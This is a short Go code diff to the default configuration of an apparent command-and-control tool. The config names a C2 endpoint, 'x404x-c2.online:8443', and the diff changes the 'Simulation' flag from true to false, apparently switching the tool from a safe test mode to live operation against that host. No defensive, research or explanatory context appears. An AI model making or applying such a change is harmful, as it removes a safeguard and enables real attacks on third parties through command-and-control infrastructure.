@@ -17,7 +17,7 @@ type V26Config struct {
 func DefaultV26Config() *V26Config {
 	return &V26Config{
 		Enabled: true,
-		Simulation: true,
+		Simulation: false,
 		C2Endpoint: "x404x-c2.online:8443",
 	}
 }
